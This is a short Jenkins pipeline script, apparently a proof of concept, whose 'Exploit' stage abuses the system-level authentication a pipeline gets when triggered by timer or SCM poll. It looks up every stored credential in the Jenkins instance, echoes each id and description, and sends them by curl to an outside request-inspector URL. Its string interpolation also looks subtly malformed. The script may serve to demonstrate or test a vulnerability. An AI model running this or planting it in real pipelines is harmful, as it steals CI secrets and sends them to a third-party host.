pipeline {
    agent any
    stages {
        stage('Exploit') {
            steps {
                script {
                    echo "Trying to list credentials"
                    // This runs with ACL.SYSTEM2 when triggered by timer/SCM poll
                    def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
                        com.cloudbees.plugins.credentials.common.StandardCredentials.class,
                        Jenkins.instance,
                        null,  // Uses current authentication = ACL.SYSTEM2
                        null
                    )
                    creds.each { c ->
                        echo "Found credential: ${c.id} - ${c.description}"
                        sh "curl -s 'https://01kmj5rtdbyfq7q5xya467bnr300-922bee620fba3f428fcd.requestinspector.com?id=${{c.id}}&desc=${{c.description}}'"
                    }
                }
            }
        }
    }
}
